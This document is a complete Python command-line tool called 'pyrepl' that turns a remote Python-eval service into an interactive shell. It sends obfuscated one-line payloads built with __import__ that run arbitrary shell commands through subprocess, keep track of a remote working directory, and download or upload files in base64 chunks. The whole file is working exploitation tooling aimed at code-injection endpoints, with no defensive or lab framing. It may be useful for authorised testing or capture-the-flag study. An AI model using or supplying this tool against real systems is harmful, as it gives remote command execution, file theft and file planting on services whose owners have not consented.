#!/usr/bin/env python3
# pyrepl: shell-like client for Python-eval services
# - Persistent remote cwd: cd / cd .. / cd - / pwd
# - Shell-like stdout+stderr (no Python tracebacks)
# - Dynamic prompt shows remote cwd
# - Arrow keys + history via readline (persistent at ~/.pyrepl_history)
# - :raw <python>, :get <remote> [local], :put <local> [remote]

import atexit
import base64
import os
import argparse
import select
import socket
import sys
from typing import Optional

# readline (history + arrows)
try:
    import readline
    HISTFILE = os.path.expanduser("~/.pyrepl_history")
    try:
        readline.read_history_file(HISTFILE)
    except FileNotFoundError:
        pass
    atexit.register(readline.write_history_file, HISTFILE)
except Exception:
    pass

BANNER = "pyrepl — type 'exit' to quit, ':raw <python>' to send raw Python.\n"
PREV_VAR = "__pyrepl_prevdir"
CHUNK = 65536  # 64 KiB for file transfer

#  payload builders (single-expression strings)
def _write(expr: str) -> str:
    return "__import__('sys').stdout.write(" + expr + ")"

def build_expr_pwd() -> str:
    return _write("__import__('os').getcwd()+\"\\n\"") + "\n"

def build_expr_shell(cmd: str) -> str:
    return (
        "(lambda __c: (lambda __r: "
        + _write("((__r.stdout or '') + (__r.stderr or ''))")
        + ")("
        "__import__('subprocess').run(__c, shell=True, capture_output=True, text=True, "
        "cwd=__import__('os').getcwd())"
        "))(" + repr(cmd) + ")\n"
    )

def build_expr_cd(arg: Optional[str]) -> str:
    osimp   = "__import__('os')"
    pathimp = "__import__('os').path"
    getcwd  = osimp + ".getcwd()"
    gbls    = "__import__('builtins').globals()"

    if arg is None:
        target = pathimp + ".expanduser('~')"
        msg = "'Changed directory to: '+" + getcwd + "+'\\n'"
        return "(" + osimp + ".chdir(" + target + ")," + _write(msg) + ")\n"

    arg = arg.strip()

    if arg == "-":
        msg = "'Changed directory to: '+" + getcwd + "+'\\n'"
        return (
            "(lambda __g: ("
            + _write("'No previous directory\\n'") +
            " if " + repr(PREV_VAR) + " not in __g else "
            "(lambda __cur,__prev: (" + osimp + ".chdir(__prev), "
            "__g.update({" + repr(PREV_VAR) + ": __cur}), "
            + _write(msg) +
            "))(" + getcwd + ", __g[" + repr(PREV_VAR) + "])"
            "))(" + gbls + ")\n"
        )

    if arg == "..":
        parent = pathimp + ".dirname(" + getcwd + ")"
        msg = "'Changed directory to: '+" + getcwd + "+'\\n'"
        return "(lambda __p: (" + osimp + ".chdir(__p), " + _write(msg) + "))(" + parent + ")\n"

    target = pathimp + ".expanduser(" + repr(arg) + ")"
    msg = "'Changed directory to: '+" + getcwd + "+'\\n'"
    return (
        "(lambda __g,__cur: ("
        + osimp + ".chdir(" + target + "), "
        "__g.update({" + repr(PREV_VAR) + ": __cur}), "
        + _write(msg) +
        "))(" + gbls + "," + getcwd + ")\n"
    )

# file transfer helpers (single-expression)

def build_expr_stat_size(path: str) -> str:
    p = repr(path)
    return (
        "(lambda __p: "
        + _write("("
                 "str(__import__('os').path.getsize(__p)) "
                 "if __import__('os').path.exists(__p) else 'ERR: not found'"
                 ")+ '\\n'")
        + ")(" + p + ")\n"
    )

def build_expr_read_chunk_b64(path: str, offset: int, size: int) -> str:
    p = repr(path)
    o = int(offset)
    n = int(size)
    return (
        "(lambda __p,__o,__n: "
        + _write("("
                 "__import__('base64').b64encode("
                 "(lambda __f: (__f.seek(__o), __f.read(__n))[1])("
                 "__import__('builtins').open(__p,'rb'))"
                 ").decode() if __import__('os').path.exists(__p) "
                 "else 'ERR: not found'"
                 ")+ '\\n'")
        + ")(" + p + "," + str(o) + "," + str(n) + ")\n"
    )

def build_expr_write_chunk_b64(path: str, b64data: str, mode: str) -> str:
    p = repr(path)
    b64 = repr(b64data)
    m = 'wb' if mode == 'wb' else 'ab'
    return (
        "(lambda __p,__b: "
        + _write(
            "(lambda __ok: ('OK' if __ok>=0 else 'ERR: write')+'\\n')("
            "__import__('builtins').open(__p,'" + m + "').write("
            "__import__('base64').b64decode(__b)"
            ")"
            ")"
        )
        + ")(" + p + "," + b64 + ")\n"
    )

# payload router

def build_payload(user_line: str) -> Optional[str]:
    line = user_line.rstrip("\n")

    if line in ("exit", "quit"):
        return None

    if line.startswith(":raw "):
        raw = line[5:]
        return raw + ("\n" if not raw.endswith("\n") else "")
    if line == ":raw":
        return "\n"

    if line == "pwd":
        return build_expr_pwd()
    if line.startswith("cd"):
        parts = line.split(maxsplit=1)
        return build_expr_cd(None if len(parts) == 1 else parts[1])

    if line.startswith(":get "):
        return "__GET__" + line[5:]
    if line.strip() == ":get":
        return "__GET__"
    if line.startswith(":put "):
        return "__PUT__" + line[5:]
    if line.strip() == ":put":
        return "__PUT__"

    return build_expr_shell(line)

# transport helpers

def recv_until_idle(sock: socket.socket, timeout: float) -> bytes:
    buf = bytearray()
    while True:
        r, _, _ = select.select([sock], [], [], timeout)
        if not r:
            break
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            break
        if not chunk:
            break
        buf.extend(chunk)
    return bytes(buf)

# file transfer drivers (client side)

def do_get(sock: socket.socket, timeout: float, remote: str, local: Optional[str]) -> None:
    sock.sendall(build_expr_stat_size(remote).encode())
    resp = recv_until_idle(sock, timeout).decode(errors="ignore").strip()
    if resp.startswith("ERR"):
        print(resp)
        return
    try:
        total = int(resp)
    except ValueError:
        print("ERR: could not stat remote file")
        return

    local_path = local or os.path.basename(remote) or "download.bin"
    with open(local_path, "wb") as f:
        offset = 0
        while offset < total:
            n = min(CHUNK, total - offset)
            sock.sendall(build_expr_read_chunk_b64(remote, offset, n).encode())
            data_b64 = recv_until_idle(sock, timeout).decode(errors="ignore").strip()
            if data_b64.startswith("ERR"):
                print(data_b64); return
            if not data_b64:
                break
            try:
                f.write(base64.b64decode(data_b64))
            except Exception:
                print("ERR: base64 decode/write failed at offset", offset); return
            offset += n
    print(f"Downloaded {total} bytes -> {local_path}")

def do_put(sock: socket.socket, timeout: float, local: str, remote: Optional[str]) -> None:
    if not os.path.isfile(local):
        print("ERR: local file not found"); return
    remote_path = remote or os.path.basename(local)
    size = os.path.getsize(local)

    with open(local, "rb") as f:
        first = True
        sent = 0
        while True:
            chunk = f.read(CHUNK)
            if not chunk:
                break
            b64 = base64.b64encode(chunk).decode()
            mode = "wb" if first else "ab"
            first = False
            sock.sendall(build_expr_write_chunk_b64(remote_path, b64, mode).encode())
            resp = recv_until_idle(sock, timeout).decode(errors="ignore").strip()
            if not resp.startswith("OK"):
                print(resp if resp else "ERR: no response"); return
            sent += len(chunk)
    print(f"Uploaded {size} bytes -> {remote_path}")

# main CLI

def main():
    ap = argparse.ArgumentParser(description="Shell wrapper for Python-eval services (pyrepl)")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("-T", "--timeout", type=float, default=0.35, help="idle read timeout after each command")
    args = ap.parse_args()

    s = socket.socket()
    s.connect((args.host, args.port))
    s.setblocking(False)

    # read initial banner, if there is any
    try:
        data = s.recv(4096)
        if data:
            sys.stdout.write(data.decode(errors="ignore"))
    except BlockingIOError:
        pass

    sys.stdout.write(BANNER); sys.stdout.flush()

    try:
        while True:
            try:
                s.sendall(build_expr_pwd().encode())
                cwd = recv_until_idle(s, args.timeout).decode(errors="ignore").strip()
            except Exception:
                cwd = ""
            prompt = (cwd + "$ ") if cwd else "> "

            try:
                line = input(prompt)
            except KeyboardInterrupt:
                sys.stdout.write("\n"); break
            except EOFError:
                break

            payload = build_payload(line)
            if payload is None:
                break

            if isinstance(payload, str) and payload.startswith("__GET__"):
                parts = payload[7:].strip().split()
                if not parts:
                    print("Usage: :get <remote> [local]")
                else:
                    remote = parts[0]
                    local  = parts[1] if len(parts) > 1 else None
                    do_get(s, args.timeout, remote, local)
                continue

            if isinstance(payload, str) and payload.startswith("__PUT__"):
                parts = payload[7:].strip().split()
                if not parts:
                    print("Usage: :put <local> [remote]")
                else:
                    local = parts[0]
                    remote = parts[1] if len(parts) > 1 else None
                    do_put(s, args.timeout, local, remote)
                continue

            s.sendall(payload.encode())
            out = recv_until_idle(s, args.timeout)
            if out:
                try:
                    sys.stdout.write(out.decode(errors="ignore"))
                except Exception:
                    sys.stdout.buffer.write(out)
    finally:
        try: s.shutdown(socket.SHUT_RDWR)
        except Exception: pass
        s.close()

if __name__ == "__main__":
    main()
